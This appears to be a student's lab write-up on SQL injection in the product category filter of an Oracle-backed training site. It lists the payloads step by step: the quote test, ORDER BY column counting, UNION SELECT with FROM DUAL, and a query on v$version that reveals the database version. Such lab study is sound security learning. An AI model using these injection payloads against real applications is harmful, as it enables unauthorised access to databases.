LAB 07: SQL injection attack, querying the database type and version on Oracle

VULNERABLE CATEGORY: In the product category filter

End Goal: Display the database version string

ANALYSIS:
1. To conform it's vulnerable to sql-injection I will add a single quote(') that should show some error like :Internal server error ==> and it does shows so the page is vulnerable to sqli

2. There is two steps to perform to before we can output data from the database
    2A*** Determine the number of columns
            *** ' ORDER BY 1-- ==> and the result is shown (we got a 200 response code)
            *** ' ORDER BY 2-- ==> and again the result is shown (we do got a 200 response code)
            *** ' ORDER BY 3-- ==> we got an Internal server error this means that, the total number of column in the backend database is: (3-1)=2
      
     2B*** Determine the what dataypes does the columns holdes
            *** I already know there is two number of column do exist so I can directly use:
                  ' UNION SELECT NULL,NULL-- ==> this should give me 200 respose but it's giving me Internal Server error
                  ***since I am using the oracle databse so I have to use FROM with every SELECT statement so,
                  *** ' UNION SELECT 'a','b' FROM DUAL-- 

3. Output the version of the database
      *** This is oracle database so for outputting the version of database we use:
      *** SELECT banner FROM v$version
      *** SELECT version FROM v$instance   
      *** so we have two column the version of database we will get by following this query:
      *** ' UNION SELECT banner(first column),NULL(second column) FROM v$version--
      *** ' UNION SELECT banner,NULL FROM v$version-- ==> OR I can pass NULL into first column and banner into second column as well

4. By this we successfully complete the exercise now let's scipt it in the python.             



    